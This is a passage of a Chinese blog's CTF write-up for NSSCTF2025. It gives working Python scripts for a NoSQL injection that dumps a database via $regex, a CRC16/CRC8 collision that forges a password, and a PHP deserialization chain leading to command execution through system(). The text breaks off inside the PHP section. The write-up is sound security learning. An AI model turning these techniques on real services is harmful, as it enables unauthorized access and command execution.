<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="NSSCTF2025"><meta name="keywords" content="NSSCTF2025"><meta name="author" content="JGwebre,undefined"><meta name="copyright" content="JGwebre"><title>NSSCTF2025【JG的个人博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- script(src=url_for("/js/mathjax/mathjax.js"))--><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"M89DTZNQI5","apiKey":"3349454e63ed12455aa77088742476f1","indexName":"heisha","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: {"path":"search.json","languages":{"hits_empty":"local_search.hits_empty"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {},
  valine: {"appId":"vBmF8qvDShMMqm39diUFWroM-gzGzoHsz","appKey":"vcClV59WM7pPzz3R46pITQlv","placeholder":"welcome to say something..."},
  twikoo: {},
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="JG的个人博客" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-signin"><span class="toc-number">1.1.</span> <span class="toc-text">ez_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzCRC"><span class="toc-number">1.2.</span> <span class="toc-text">EzCRC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mpga-filesystem"><span class="toc-number">1.3.</span> <span class="toc-text">[mpga]filesystem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-upload"><span class="toc-number">1.4.</span> <span class="toc-text">ez_upload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-number">2.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Checkit"><span class="toc-number">2.1.</span> <span class="toc-text">Checkit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-number">3.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Guillotine"><span class="toc-number">3.1.</span> <span class="toc-text">Guillotine</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE"><span class="toc-number">4.</span> <span class="toc-text">MOBILE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E8%B0%81%EF%BC%9F%EF%BC%81"><span class="toc-number">4.1.</span> <span class="toc-text">我是谁？！</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">JGwebre</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/heisha123" target="_blank">GitHub<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="mailto:gzyjslb@163.com" target="_blank">E-Mail<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1852384503&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color8"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">20</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">14</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">2</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">JG的个人博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">NSSCTF2025</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2025-08-23 | 更新于 2025-08-25</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/CTF/">CTF</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/NSSCTF2025/">NSSCTF2025</a></div></div></div><div class="main-content"><p>JGCTF-第8-WP</p>
<span id="more"></span>

<p><img src="/2025/08/23/JGCTF-8-WP/image1.png"></p>
<p>有没有PWN手MISC手救救我</p>
<p>单打独斗太难了</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h2><p>拿到附件分析源码</p>
<p>丢ai说存在NoSQL 注入漏洞</p>
<p>写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node8.anna.nssctf.cn:26824/search&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 NoSQL 注入 payload，返回所有书籍</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span>&#125;,  <span class="comment"># 匹配所有 title</span></span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;author&quot;</span>: &#123;<span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span>&#125;  <span class="comment"># 匹配所有 author</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"> resp = requests.post(url, json=payload, headers=headers)</span><br><span class="line"></span><br><span class="line"> books = resp.json()</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 筛选可能的 flag</span></span><br><span class="line"></span><br><span class="line"> flag_pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;NSSCTF\&#123;.*?\&#125;&quot;</span>, re.I)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> b <span class="keyword">in</span> books:</span><br><span class="line"></span><br><span class="line">  text = <span class="string">&quot; &quot;</span>.join([<span class="built_in">str</span>(b.get(<span class="string">&quot;title&quot;</span>,<span class="string">&quot;&quot;</span>)), <span class="built_in">str</span>(b.get(<span class="string">&quot;author&quot;</span>,<span class="string">&quot;&quot;</span>)), <span class="built_in">str</span>(b.get(<span class="string">&quot;description&quot;</span>,<span class="string">&quot;&quot;</span>))])</span><br><span class="line"></span><br><span class="line"> <span class="keyword">match</span> = flag_pattern.search(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line"></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;[+] Flag found:&quot;</span>, <span class="keyword">match</span>.group())</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Flag not found in returned data.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>, e)</span><br></pre></td></tr></table></figure>



<p><img src="/2025/08/23/JGCTF-8-WP/image2.png"></p>
<h2 id="EzCRC"><a href="#EzCRC" class="headerlink" title="EzCRC"></a>EzCRC</h2><p>思路很简单：<br>后端先比长度，再分别校验 CRC16 和 CRC8 是否与真口令一致，但不允许口令本身完全相等。所以我们只要构造一个与真口令长度相同、CRC16 与 CRC8 都相同但内容不同的字符串即可过关拿到 flag。</p>
<p>关键点：CRC 是线性的（按字节串行更新），固定前缀后，选择最后 3 个字节就能把两个 CRC 都“调回”到目标值。因此可以保留前 12 个字节不变，只改最后 3 个字节，做一个“双 CRC 碰撞”。</p>
<p>写解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc16</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">  checksum = <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">    checksum ^= b</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> checksum &amp; <span class="number">1</span>:</span><br><span class="line">    </span><br><span class="line">        checksum = ((checksum &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        checksum &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> checksum &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_crc8</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">  crc8_table = [</span><br><span class="line"></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>,</span><br><span class="line"></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  crc = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">    crc = crc8_table[(crc ^ b) &amp; <span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> crc &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">SECRET_PASS = <span class="string">b&quot;Enj0yNSSCTF4th!&quot;</span></span><br><span class="line"></span><br><span class="line">target_crc16 = compute_crc16(SECRET_PASS)</span><br><span class="line"></span><br><span class="line">target_crc8 = calculate_crc8(SECRET_PASS)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Target CRC16:&quot;</span>, <span class="built_in">hex</span>(target_crc16))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Target CRC8 :&quot;</span>, <span class="built_in">hex</span>(target_crc8))</span><br><span class="line"></span><br><span class="line">prefix = SECRET_PASS[:-<span class="number">3</span>] <span class="comment"># 前 12 个字节固定，最后 3 个字节暴力枚举</span></span><br><span class="line"></span><br><span class="line">found = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> b2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    </span><br><span class="line">      candidate = prefix + <span class="built_in">bytes</span>([b1, b2, b3])</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> candidate == SECRET_PASS:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> compute_crc16(candidate) == target_crc16 <span class="keyword">and</span> calculate_crc8(candidate) == target_crc8:</span><br><span class="line">    </span><br><span class="line">        found = candidate</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found collision:&quot;</span>, candidate)</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hex:&quot;</span>, candidate.<span class="built_in">hex</span>())</span><br><span class="line">    </span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Not found&quot;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="/2025/08/23/JGCTF-8-WP/image3.png"></p>
<p>计算出后直接提交</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node8.anna.nssctf.cn:24277/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;Enj0yNSSCTF4e\xa8-&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;pass&quot;</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<p><img src="/2025/08/23/JGCTF-8-WP/image4.png"></p>
<h2 id="mpga-filesystem"><a href="#mpga-filesystem" class="headerlink" title="[mpga]filesystem"></a>[mpga]filesystem</h2><p>下载<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>拿到源码</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image5.png"></p>
<p>存在反序列化</p>
<p>找利用链</p>
<p>FileManager::__toString() 会根据 $_POST[‘method’] 调用类内任意方法：</p>
<p>如果 targetFile 被设置为一个 ContentProcessor 对象 → 在 performWriteOperation($var) 中：这里访问了 $targetObject-&gt;$var → 触发 ContentProcessor::__get()。</p>
<p>ContentProcessor::__get() 又会调用：</p>
<p>如果 $this-&gt;callbackFunction 被设置为某个 系统函数名（如 system、exec、passthru），就会把 $_POST[‘cmd’] 当成命令执行。</p>
<p>FunctionInvoker::__call() 也允许通过对象属性调用任意函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 